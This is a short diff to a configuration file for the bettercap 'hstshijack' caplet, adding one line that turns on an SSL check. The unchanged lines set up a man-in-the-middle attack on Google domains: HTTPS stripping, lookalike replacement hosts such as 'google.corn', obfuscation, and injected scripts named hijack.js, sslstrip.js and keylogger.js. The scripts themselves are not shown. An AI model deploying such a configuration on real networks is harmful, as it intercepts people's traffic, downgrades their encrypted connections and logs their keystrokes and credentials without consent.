@@ -13,6 +13,7 @@ set hstshijack.targets         *.google.com, google.com, gstatic.com, *.gstatic.
 set hstshijack.replacements    *.google.corn,google.corn,gstatic.corn,*.gstatic.corn
 set hstshijack.ssl.domains     /usr/local/share/bettercap/caplets/hstshijack/domains.txt
 set hstshijack.ssl.index       /usr/local/share/bettercap/caplets/hstshijack/index.json
+set hstshijack.ssl.check       true
 #set hstshijack.blockscripts    example.com,*.example.com
 set hstshijack.obfuscate       true
 set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
